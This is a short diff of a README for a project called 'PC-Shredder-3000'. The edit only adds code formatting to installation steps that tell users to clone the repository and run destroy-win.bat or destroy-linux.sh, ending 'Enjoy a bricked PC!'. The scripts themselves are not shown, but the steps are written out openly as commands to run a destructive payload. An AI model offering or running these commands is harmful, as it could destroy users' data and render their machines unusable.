@@ -25,15 +25,15 @@ Installation:
 
 Universal: Run this command:
 
-git clone https://github.com/TheNewEraBrad/PC-Shredder-3000
+`git clone https://github.com/TheNewEraBrad/PC-Shredder-3000`
 
-For Windows users: Download the files as zip and extract, run destroy-win.bat
+For Windows users: Download the files as zip and extract, run `destroy-win.bat`
 
 For Linux users: Use git or Download as zip and run the following commands:
 
-chmod +x destroy-linux.sh
+`chmod +x destroy-linux.sh`
 
-./destroy-linux.sh
+`./destroy-linux.sh`
 
 Enjoy a bricked PC!
 
